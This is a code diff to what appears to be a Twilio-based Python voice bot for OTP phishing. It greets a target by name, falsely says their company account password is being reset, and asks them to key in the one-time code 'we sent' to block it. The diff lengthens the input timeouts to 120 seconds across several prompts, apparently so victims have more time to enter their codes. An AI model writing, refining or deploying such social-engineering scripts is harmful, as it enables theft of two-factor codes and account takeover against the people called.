@@ -8,7 +8,7 @@ def voice():
     # Start a TwiML response
     resp = VoiceResponse()
     resp.say(f"Hello {open('Extra/Name.txt', 'r').read()}, your {open('Extra/Company Name.txt', 'r').read()} account password is trying to be reset,")
-    gather = Gather(num_digits=1, action='/gather')
+    gather = Gather(num_digits=1, action='/gather', timeout=120)
     gather.say('If this was not you please press 1,')
     resp.append(gather)
 
@@ -28,7 +28,7 @@ def gather():
 
         # <Say> a different message depending on the caller's choice
         if choice == '1':
-            gatherotp = Gather(num_digits=int(open("Extra/Digits.txt", 'r').read()), action='/gatherotp')
+            gatherotp = Gather(num_digits=int(open("Extra/Digits.txt", 'r').read()), action='/gatherotp', timeout=120)
             gatherotp.say(f'To block the request, please give us the {open("Extra/Digits.txt", "r").read()} digits code that we sent')
             resp.append(gatherotp)
             return str(resp)
@@ -73,7 +73,7 @@ def voiceagain():
     # Start a TwiML response
     resp = VoiceResponse()
     resp.say(f"Hello {open('Extra/Name.txt', 'r').read()}, it seems like you accidently type wrong one time passcode,")
-    gather = Gather(num_digits=1, action='/gather')
+    gather = Gather(num_digits=1, action='/gather', timeout=120)
     gather.say('To enter the one time passcode again,Press 1,')
     resp.append(gather)
 
